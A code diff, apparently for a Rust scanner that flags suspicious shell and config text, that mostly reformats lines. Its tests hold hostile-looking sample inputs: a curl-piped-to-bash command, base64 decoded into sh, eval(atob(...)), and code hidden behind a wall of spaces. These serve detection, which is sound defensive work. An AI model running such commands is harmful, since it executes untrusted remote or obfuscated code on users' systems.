@@ -50,14 +50,26 @@ pub fn scan_text(text: &str) -> Vec<Hit> {
     let mut hits: Vec<Hit> = patterns()
         .iter()
         .filter(|p| p.re.is_match(text))
-        .map(|p| Hit { reason: p.reason, severity: p.severity })
+        .map(|p| Hit {
+            reason: p.reason,
+            severity: p.severity,
+        })
         .collect();
     if text.lines().any(|l| l.len() > 5_000) {
-        hits.push(Hit { reason: "has an extremely long single line (typical of hidden, minified malware)", severity: Severity::Medium });
+        hits.push(Hit {
+            reason: "has an extremely long single line (typical of hidden, minified malware)",
+            severity: Severity::Medium,
+        });
     }
     // Code pushed far to the right with whitespace so it's off-screen in editors.
-    if text.lines().any(|l| l.len() > 300 && l.trim_start().len() > 50 && l.contains(&" ".repeat(200))) {
-        hits.push(Hit { reason: "hides code far to the right behind a wall of spaces", severity: Severity::High });
+    if text
+        .lines()
+        .any(|l| l.len() > 300 && l.trim_start().len() > 50 && l.contains(&" ".repeat(200)))
+    {
+        hits.push(Hit {
+            reason: "hides code far to the right behind a wall of spaces",
+            severity: Severity::High,
+        });
     }
     hits.sort_by_key(|h| std::cmp::Reverse(h.severity));
     hits
@@ -96,10 +108,16 @@ mod tests {
 
     #[test]
     fn detects_common_bad_things() {
-        assert_eq!(worst(&scan_text("curl -fsSL http://x.y/i | bash")), Some(Severity::High));
+        assert_eq!(
+            worst(&scan_text("curl -fsSL http://x.y/i | bash")),
+            Some(Severity::High)
+        );
         assert_eq!(worst(&scan_text("echo aGk= | base64 -d | sh")), Some(Severity::High));
         assert_eq!(worst(&scan_text("eval(atob('ZG9j'))")), Some(Severity::High));
-        assert_eq!(worst(&scan_text("git push origin HEAD --force")), Some(Severity::Medium));
+        assert_eq!(
+            worst(&scan_text("git push origin HEAD --force")),
+            Some(Severity::Medium)
+        );
         assert_eq!(worst(&scan_text("node ~/.cache/x/run.js")), Some(Severity::Medium));
         let padded = format!("module.exports = {{}};{}eval(x)", " ".repeat(400));
         assert_eq!(worst(&scan_text(&padded)), Some(Severity::High));
@@ -108,7 +126,10 @@ mod tests {
     #[test]
     fn ignores_normal_config() {
         assert!(scan_text(r#"eval "$(/opt/homebrew/bin/brew shellenv)""#).is_empty());
-        assert!(scan_text("export NVM_DIR=\"$HOME/.nvm\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"").is_empty());
+        assert!(
+            scan_text("export NVM_DIR=\"$HOME/.nvm\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"")
+                .is_empty()
+        );
         assert!(scan_text("npx lint-staged").is_empty());
         assert!(scan_text("source ~/.oh-my-zsh/oh-my-zsh.sh").is_empty());
         assert!(scan_text("export GITHUB_TOKEN=abc").is_empty());
